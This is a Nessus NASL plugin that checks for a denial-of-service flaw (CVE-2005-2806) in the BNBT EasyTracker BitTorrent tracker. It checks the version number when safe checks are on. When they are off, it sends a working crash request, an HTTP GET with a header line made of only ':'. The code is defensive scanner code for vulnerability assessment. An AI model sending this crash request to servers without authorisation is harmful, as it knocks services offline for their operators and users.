#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server is prone to denial of service attacks. 

Description :

The remote host is running BNBT EasyTracker, a packaged BitTorrent
Tracker Installer for Windows. 

The remote version of BNBT EasyTracker fails to properly handle
malformed HTTP requests, making it prone to denial of service attacks. 
An attacker can crash the application by sending a request with a
header line consisting of only a ':'. 

See also :

http://www.securityfocus.com/archive/1/409621

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";


if (description) {
  script_id(19548);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2806");
  script_bugtraq_id(14700);

  name["english"] = "BNBT EasyTracker Malformed Request Denial Of Service Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for malformed request denial of service vulnerability in BNBT EasyTracker";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 6969);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:6969);
if (!get_port_state(port)) exit(0);


# Grab the initial page.
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (res == NULL) exit(0);

# If it looks like BNBT EasyTracker...
if ("<title>BNBT Tracker Info</title>" >< res) {

  # If safe checks are enabled...
  if (safe_checks()) {
    pat = 'POWERED BY <a href="http://bnbteasytracker.sourceforge.net".+The Trinity Edition of BNBT - Build (.+) - Click';
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          # nb: see <http://bnbteasytracker.sourceforge.net/changelog.php>
          #     for version numbers.
          if (ver =~ "^(200[0-4]\.|[0-6]\.|7\.([0-6]r|7r3\.2004))") {
            desc = str_replace(
              string:desc["english"],
              find:"See also :",
              replace:string(
                "***** Nessus has determined the vulnerability exists on the remote\n",
                "***** host simply by looking at the version number of BNBT EasyTracker\n",
                "***** installed there.\n",
                "\n",
                "See also :"
              )
            );
            security_note(port:port, data:desc);
            exit(0);
          }
          break;
        }
      }
    }
  }
  # Otherwise, try to crash it.
  else {
    soc = http_open_socket(port);
    if (soc) {
      req = string(
        "GET /index.htm HTTP/1.1\r\n",
        ":\r\n",
        "\r\n"
      );
      send(socket:soc, data:req);
      res = http_recv(socket:soc);
      http_close_socket(soc);
      if (!res) {
        security_note(port);
        exit(0);
      }
    }
  }
}
